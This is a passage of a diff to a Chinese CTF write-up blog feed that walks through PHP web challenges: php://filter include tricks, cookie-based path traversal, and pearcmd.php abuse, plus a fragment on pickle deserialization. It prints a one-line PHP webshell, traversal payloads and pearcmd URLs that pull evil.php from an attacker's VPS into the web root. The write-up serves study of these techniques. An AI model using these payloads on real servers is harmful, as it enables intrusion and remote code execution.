+&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;open_basedir&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;./&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
+&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">elseif&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;php://filter/resource=&lt;/span>&lt;span style="color:#d88200">$file&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?action=w&amp;amp;c=&amp;lt;?php @eval($_POST['wuhu']);?&amp;gt;
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?action=r&amp;amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9
+POST: wuhu=phpinfo();
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023214748589.png" alt="image-20211023214748589">&lt;/p>
+&lt;h3 id="对于payload的底层代码分析">对于payload的底层代码分析&lt;/h3>
+&lt;p>原理分析来自Guoke佬 我只是个会复现的铁沸物……&lt;/p>
+&lt;p>首先下一份7.2.34的源码&lt;/p>
+&lt;p>定位到包装器所在的文件位置/ext/standard/php_fopen_wrapper.c，178行起是php_stream_url_wrap_php()的代码&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210116402.png" alt="image-20211024210116402">&lt;/p>
+&lt;p>191行，先碰到&lt;code>php://&lt;/code>会执行&lt;code>path += 6&lt;/code>；之后接着349行会碰到&lt;code>filter/&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210420398.png" alt="image-20211024210420398">&lt;/p>
+&lt;p>没有mode，此时&lt;/p>
+&lt;pre tabindex="0">&lt;code>path=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
+&lt;/code>&lt;/pre>&lt;p>357行执行strdup()，把path第6位之后的内容赋给pathdup指针上&lt;/p>
+&lt;pre tabindex="0">&lt;code>pathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
+&lt;/code>&lt;/pre>&lt;p>358行strstr()返回pathdup的指针中/resource=出现的位置，到365行的判断&lt;/p>
+&lt;pre tabindex="0">&lt;code>p+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
+&lt;/code>&lt;/pre>&lt;p>372行的php_strtok_r()对pathdup+1的位置以'/&amp;lsquo;为标志进行分割&lt;/p>
+&lt;pre tabindex="0">&lt;code>p=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
+&lt;/code>&lt;/pre>&lt;p>得到resource=，进373行的while循环，先是到378行的php_stream_apply_filter_list()，转至159行&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024230730886.png" alt="image-20211024230730886">&lt;/p>
+&lt;p>将p作为过滤器进行注册，161行php_stream_filter_append()应用到文件流上，但显然resource不是流包装器，干不了事，那就再到while循环里接着向后找，直到向后碰到read&lt;/p>
+&lt;pre tabindex="0">&lt;code>p=/read=convert.base64-decode/resource=/../../../../../1.txt
+&lt;/code>&lt;/pre>&lt;p>进入374行，执行php_stream_apply_filter_list之后就变成了&lt;/p>
+&lt;pre tabindex="0">&lt;code>p=convert.base64-decode/resource=/../../../../../1.txt
+&lt;/code>&lt;/pre>&lt;p>此时的p=convert.base64-decode，就可以正常的b64解码我们的内容了&lt;/p>
+&lt;h3 id="再回头看这个题">再回头看这个题&lt;/h3>
+&lt;p>代码很短，限制在于写入的文件内容被b64加密&amp;amp;open_basedir&amp;amp;include已经写好的包装器和一部分固定的内容&lt;/p>
+&lt;p>我刚开始卡在了已经写死的包装器的开头还怎么加conver.base64-decode？然后发现是我想多了，可以接着套，底层原理见上，会向后循环取值直到碰到一个正常的流包装器&lt;/p>
+&lt;p>第二个问题就是目录穿越了，前面加了5层buff，从结果倒推感觉可以理解，但是自己却没试出来，我的问题&lt;/p>
+&lt;p>最后open_basedir的绕过反而是最轻松的，蚁剑插件直接搞&lt;/p>
+&lt;p>参考：&lt;a href="https://www.laruence.com/2010/05/04/1450.html">深入理解PHP之require/include顺序&lt;/a> | &lt;a href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols / Wrappers&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用&lt;/a>&lt;/p>
+&lt;h2 id="new_hospital">new_hospital&lt;/h2>
+&lt;p>响应cookie会有个API&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023225411779.png" alt="image-20211023225411779">&lt;/p>
+&lt;p>将API设为flag.php &lt;code>ZmxhZy5waHA%3d&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230544476.png" alt="image-20211023230544476">&lt;/p>
+&lt;p>扫目录 得到/old/feature.php 将路径改为这个&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230842820.png" alt="image-20211023230842820">&lt;/p>
+&lt;p>将API改为../flag.php &lt;code>Li4vZmxhZy5waHA%3d&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230912588.png" alt="image-20211023230912588">&lt;/p>
+&lt;p>————其实如果先扫目录扫到/old/feature.php的话，可以将API设为./feature.php &lt;code>Li9mZWF0dXJlLnBocA%3d%3d&lt;/code> 读到这一段&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023231112340.png" alt="image-20211023231112340">&lt;/p>
+&lt;p>后端的逻辑就是将cookie[&amp;lsquo;api&amp;rsquo;]取出，直接读出内容&lt;/p>
+&lt;p>有一点点脑洞，也跟眼力见有关系，我一开始是真没注意到这个cookie的API字段，属实是有点大病；之后做题还是要开环境之后就连burp，注意观察响应头的特殊字段 cookie的类型/ctrl+u的源码/可能会有的控制台的提示信息/robots.txt这些东西，不要遗漏，不然就很可惜了&lt;/p>
+&lt;h2 id="give_me_you_0day">Give_me_you_0day&lt;/h2>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023131341209.png" alt="image-20211023131341209">&lt;/p>
+&lt;p>这里考察的点并不是Typecho 1.1/17.10.30版本的0day（给出的源码就完全是github上的发行版），而是install.php中 608行存在一个文件包含&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023233205364.png" alt="image-20211023233205364">&lt;/p>
+&lt;p>利用这个文件包含的点来搞，payload可以直接参考&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030247104.png" alt="image-20211024030247104">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024025903697.png" alt="image-20211024025903697">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030018830.png" alt="image-20211024030018830">&lt;/p>
+&lt;p>打的点在于peclcmd，这里涉及到的题和知识害挺多，之前真没见过（dbq是我做的题太少太少了），在这里一并学习了&lt;/p>
+&lt;h3 id="关于register_argc_argv配置项">关于&lt;code>register_argc_argv&lt;/code>配置项&lt;/h3>
+&lt;p>是php.ini核心配置中的一个选项，默认是这样&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024002824679.png" alt="image-20211024002824679">&lt;/p>
+&lt;p>&lt;a href="https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv">手册&lt;/a>是这样写的&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000219559.png" alt="image-20211024000219559">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000145606.png" alt="image-20211024000145606">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000543235.png" alt="image-20211024000543235">&lt;/p>
+&lt;p>从php=4.0.0后为可设置的选项（此前总为On）默认为开启状态，当php&amp;lt;=4.2.3时可修改范围是&lt;code>PHP_INI_ALL&lt;/code>，更详细的内容可以参见-&amp;gt;&lt;a href="http://ms7.fhsh.tp.edu.tw/php5c/features.commandline.html">PHP的命令行模式&lt;/a>&lt;/p>
+&lt;p>在&lt;code>register_argc_argv&lt;/code>开启的情况下，cgi和cli模式下都可以直接访问到传入的参数；其中argc是传递过去的参数的个数，argv是包含有实际参数的数组；cli模式测试如下&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#75715e">// var_dump($HTTP_SERVER_VARS[&amp;#39;argv&amp;#39;]);
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003201497.png" alt="image-20211024003201497">&lt;/p>
+&lt;p>cgi的话，直接用上面的&lt;code>$_SERVER['argv']&lt;/code>是不会获取到值&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003801051.png" alt="image-20211024003801051">&lt;/p>
+&lt;p>直接查看$_SERVER这个大数组，可以发现我们的参数在这里是以一整个QUERY_STRING的形式出现的（详细的数组解析-&amp;gt;&lt;a href="https://www.feiniaomy.com/post/274.html">PHP超全局变量$_SERVER的用法&lt;/a>）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024012150841.png" alt="image-20211024012150841">&lt;/p>
+&lt;p>有个特殊的trick在于，如果是&lt;/p>
+&lt;pre tabindex="0">&lt;code>/test.php?a=1&amp;amp;b=1
+&lt;/code>&lt;/pre>&lt;p>确实是两个参数，但返回的$_SERVER[&amp;lsquo;argv&amp;rsquo;]为1，如果是&lt;/p>
+&lt;pre tabindex="0">&lt;code>/test.php?a=1+b=1
+&lt;/code>&lt;/pre>&lt;p>则会被截断，返回$_SERVER[&amp;lsquo;argv&amp;rsquo;]则为2（说实话我本地真没跑出来这个 可能是哪里的配置有问题？但是看了很多资料，这里应该是可以被复现成功的………………emmmm 有一点点离谱）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020719209.png" alt="image-20211024020719209">&lt;/p>
+&lt;h3 id="关于pear命令">关于&lt;code>pear&lt;/code>命令&lt;/h3>
+&lt;p>pear是&lt;em>the PHP Extention and Application Repository&lt;/em>的缩写，是一个PHP扩展与应用的代码仓库，pear仓库代码以包&lt;em>package&lt;/em>分区，每一个&lt;em>pear package&lt;/em>都是一个独立的项目，有自己独立的开发团队、版本控制、文档和其他包的依赖关系信息；&lt;em>pear package&lt;/em>以phar, tar, zip形式发布，通过&lt;code>apt install php-pear&lt;/code>来安装&lt;/p>
+&lt;p>pear命令的实现是一个sh脚本&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/sh
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>
+&lt;span style="color:#75715e"># first find which PHP binary to use&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
+&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_bin&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
+&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>php
+&lt;span style="color:#00a8c8">else&lt;/span>
+&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">fi&lt;/span>
+&lt;span style="color:#00a8c8">fi&lt;/span>
+&lt;span style="color:#75715e"># then look for the right pear include dir&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
+&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>
+&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_dir&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
+&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`&lt;/span>dirname &lt;span style="color:#111">$0&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
+&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">else&lt;/span>
+&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span>
+&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=/usr/local/lib/php&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">fi&lt;/span>
+&lt;span style="color:#00a8c8">fi&lt;/span>
+&lt;span style="color:#111">exec&lt;/span> &lt;span style="color:#111">$PHP&lt;/span> -C -q &lt;span style="color:#111">$INCARG&lt;/span> -d data.timezone&lt;span style="color:#f92672">=&lt;/span>UTC -d &lt;span style="color:#111">output_buffering&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> -d &lt;span style="color:#111">variables_order&lt;/span>&lt;span style="color:#f92672">=&lt;/span>EGPCS -d &lt;span style="color:#111">open_basedir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">safe_mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> -d &lt;span style="color:#111">register_argc_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_prepend_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_append_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">$INCDIR&lt;/span>/pearcmd.php &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$@&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>从最后一行可以看到调用了/pearcmd.php，而这个pearcmd.php的参数$argv就来源于$_SERVER[&amp;lsquo;argv&amp;rsquo;]，这个是我们可控的传入参数&lt;/p>
+&lt;h3 id="利用pear命令执行任意文件下载">利用&lt;code>pear&lt;/code>命令执行任意文件下载&lt;/h3>
+&lt;p>如图，直接下载开启了http服务器的目录下的指定文件到当前所在目录&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020030648.png" alt="image-20211024020030648">&lt;/p>
+&lt;p>使用&lt;code>install -R&lt;/code>而非&lt;code>download&lt;/code>可以控制下载到任意目录，比如直接下载到web服务的目录&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020411477.png" alt="image-20211024020411477">&lt;/p>
+&lt;h3 id="所以总体思路payload">所以总体思路+payload&lt;/h3>
+&lt;p>如果存在这样的环境&lt;/p>
+&lt;ul>
+&lt;li>安装pear&lt;/li>
+&lt;li>开启register_argc_argv&lt;/li>
+&lt;li>存在可控的传入参数来做到文件包含（比如&lt;code>include $_GET['f'].php&lt;/code>）&lt;/li>
+&lt;li>可以出网&lt;/li>
+&lt;/ul>
+&lt;p>我们就可以做到任意文件下载从而getshell；前面也提到register_argc_argv继续PHP_IN_PREDIR，我们可以留一个.user.ini的后门来设置register_argc_agrv为On&lt;/p>
+&lt;p>&lt;strong>payload&lt;/strong>就是这样了&lt;/p>
+&lt;pre tabindex="0">&lt;code>// 存在 include $_GET['f'].php
+// web目录可写
+- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/evil.php
+- http://ip:port/tmp/pear/download/evil.php
+// tmp目录可写
+- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/tmp+http://ip:port/evil.php
+- http://ip:port/include.php?f=/tmp/pear/download/evil
+&lt;/code>&lt;/pre>&lt;p>首先要包含一个正确位置的pearcmd.php（通常在/usr/local/lib/php/pearcmd.php），接着包含&amp;amp;+download+http://your_vps/eval.php（或者如果前面直接是/pearcmd.php的话就可以直接给参数了/pearcmd.php+download+http://your_vps/eval.php）来装🐎（注意路径是否正确），之后再包含我们的🐎即可&lt;/p>
+&lt;h3 id="其它的例题">其它的例题&lt;/h3>
+&lt;p>&lt;a href="https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/">[CampCTF 2015] Trolol&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.lemonprefect.cn/zh-tw/posts/9b2fbf24#MeowWorld">[巅峰极客 2020] MeowWord&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
+&lt;hr>
+&lt;p>还是做的题不够多，已有的知识也应用的不够熟练，实在是太太太太太菜了，得好好学，不能天天划水摸鱼&lt;/p></description></item><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
 &lt;blockquote>
 &lt;p>Visit the website&lt;/p>
 &lt;/blockquote>
@@ -1951,7 +2235,7 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;/details>
 &lt;h3 id="--仅可以引入builtins模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>builtins&lt;/code>模块&lt;/h3>
-&lt;p>&lt;img src="http://blog.nsfocus.net/wp-content/uploads/2019/04/9a07ed4bd4c85ec67bcc780dae379984.png" alt="9a07ed4bd4c85ec67bcc780dae379984.png">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
 &lt;p>更多知识参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | [Python 的内建对象](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/p>
 &lt;details>
 &lt;summary>
@@ -2023,7 +2307,6 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
 &lt;p>成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）&lt;/p>
-&lt;p>理解opcode时需要注意&lt;/p>
 &lt;p>————用pker&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
 &lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
